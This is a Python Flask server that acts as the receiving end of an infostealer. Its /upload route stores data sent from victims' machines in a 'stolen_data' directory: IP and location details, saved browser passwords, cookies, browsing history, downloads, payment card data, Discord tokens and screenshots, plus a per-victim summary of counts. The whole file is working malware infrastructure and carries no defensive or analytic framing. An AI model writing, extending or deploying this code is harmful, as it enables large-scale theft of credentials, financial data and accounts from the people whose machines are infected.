from flask import Flask, request, jsonify
import json
from datetime import datetime
from pathlib import Path

app = Flask(__name__)

OUTPUT_DIR = Path("stolen_data")
OUTPUT_DIR.mkdir(exist_ok=True)


@app.route('/upload', methods=['POST'])
def receive_data():
    try:
        data = request.get_json()

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        session_dir = OUTPUT_DIR / timestamp
        session_dir.mkdir(exist_ok=True)

        if 'ip_info' in data and data['ip_info']:
            ip_info = json.loads(data['ip_info']) if isinstance(
                data['ip_info'], str) else data['ip_info']
            with open(session_dir / "ip_info.json", "w", encoding="utf-8") as f:
                json.dump(ip_info, f, indent=4, ensure_ascii=False)

        if 'browser_data' in data and data['browser_data']:
            browser_data = json.loads(data['browser_data']) if isinstance(
                data['browser_data'], str) else data['browser_data']
            with open(session_dir / "browser_data.json", "w", encoding="utf-8") as f:
                json.dump(browser_data, f, indent=4, ensure_ascii=False)

            if 'passwords' in browser_data and browser_data['passwords']:
                with open(session_dir / "passwords.json", "w", encoding="utf-8") as f:
                    json.dump(browser_data['passwords'],
                              f, indent=4, ensure_ascii=False)

            if 'cookies' in browser_data and browser_data['cookies']:
                with open(session_dir / "cookies.json", "w", encoding="utf-8") as f:
                    json.dump(browser_data['cookies'], f,
                              indent=4, ensure_ascii=False)

            if 'history' in browser_data and browser_data['history']:
                with open(session_dir / "history.json", "w", encoding="utf-8") as f:
                    json.dump(browser_data['history'], f,
                              indent=4, ensure_ascii=False)

            if 'downloads' in browser_data and browser_data['downloads']:
                with open(session_dir / "downloads.json", "w", encoding="utf-8") as f:
                    json.dump(browser_data['downloads'],
                              f, indent=4, ensure_ascii=False)

            if 'cards' in browser_data and browser_data['cards']:
                with open(session_dir / "cards.json", "w", encoding="utf-8") as f:
                    json.dump(browser_data['cards'], f,
                              indent=4, ensure_ascii=False)

        if 'discord_tokens' in data and data['discord_tokens']:
            discord_tokens = json.loads(data['discord_tokens']) if isinstance(
                data['discord_tokens'], str) else data['discord_tokens']
            with open(session_dir / "discord_tokens.json", "w", encoding="utf-8") as f:
                json.dump(discord_tokens, f, indent=4, ensure_ascii=False)

        if 'screenshots' in data and data['screenshots']:
            screenshots_dir = session_dir / "screenshots"
            screenshots_dir.mkdir(exist_ok=True)

            screenshots = data['screenshots']
            for idx, screenshot_bytes in enumerate(screenshots):
                screenshot_bytes = bytes(screenshot_bytes)

                screenshot_path = screenshots_dir / f"screenshot_{idx + 1}.png"
                with open(screenshot_path, "wb") as f:
                    f.write(screenshot_bytes)

        summary = {
            "timestamp": timestamp,
            "ip": ip_info.get('query', 'unknown') if 'ip_info' in data else 'unknown',
            "country": ip_info.get('country', 'unknown') if 'ip_info' in data else 'unknown',
            "passwords_count": len(browser_data.get('passwords', [])) if 'browser_data' in data else 0,
            "cookies_count": len(browser_data.get('cookies', [])) if 'browser_data' in data else 0,
            "history_count": len(browser_data.get('history', [])) if 'browser_data' in data else 0,
            "discord_tokens_count": len(discord_tokens) if 'discord_tokens' in data else 0,
            "screenshots_count": len(screenshots) if 'screenshots' in data else 0,
        }

        with open(session_dir / "summary.json", "w", encoding="utf-8") as f:
            json.dump(summary, f, indent=4, ensure_ascii=False)

        return jsonify({"status": "success", "session": timestamp}), 200

    except Exception as e:
        print(f"Error in data processing: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == '__main__':
    print("Server running in: http://0.0.0.0:5000")
    print(f"Data will be saved in: {OUTPUT_DIR.absolute()}")
    app.run(host='0.0.0.0', port=5000, debug=True)
